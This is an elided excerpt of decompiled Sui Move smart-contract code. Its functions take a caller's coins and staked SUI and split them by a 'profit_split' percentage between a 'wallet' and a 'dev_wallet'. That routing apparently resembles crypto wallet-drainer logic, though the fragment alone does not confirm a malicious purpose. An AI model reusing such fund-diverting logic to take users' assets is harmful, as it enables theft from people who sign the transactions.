module 0xa1732056e73bc70f0a1d6fc7443931193fb38001f1b78060f39722c46acb694d::parameterized {
    ...
    public entry fun create_and_update_transfer_params(arg0: address, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
        let v0 = TransferDetails{coin_details: 0x1::vector::empty<CoinDetail>()};
        let v1 = 0;
    ...
    public entry fun create_transfer_params(arg0: address, arg1: address, arg2: address, arg3: u8, arg4: &mut 0x2::tx_context::TxContext) {
    ...
    public entry fun execute_transfer<T0>(arg0: &mut TransferParams, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        ...
        if (v6 == 0) {
            ...
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v6 * (arg0.profit_split as u64) / 100, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.dev_wallet);
        } else {
            let v9 = 0x2::coin::split<T0>(&mut arg1, v6, arg2);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut v9, v6 * (arg0.profit_split as u64) / 100, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v9, arg0.dev_wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, v0);
        };
    ...
    public entry fun update_transfer_details(arg0: &mut TransferParams, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
    ...
    public entry fun withdraw_stake(arg0: &mut 0x3::sui_system::SuiSystemState, arg1: 0x3::staking_pool::StakedSui, arg2: &TransferParams, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg2.initialized) {
            ...
            0x1::option::borrow<TransferDetails>(&arg2.details);
            ...
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut v0, v1 * (arg2.profit_split as u64) / 100, arg3), arg2.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(v0, arg2.dev_wallet);
            let v2 = DebugEvent{
                message   : 0x1::ascii::string(b"Unstaked SUI split and transferred"),
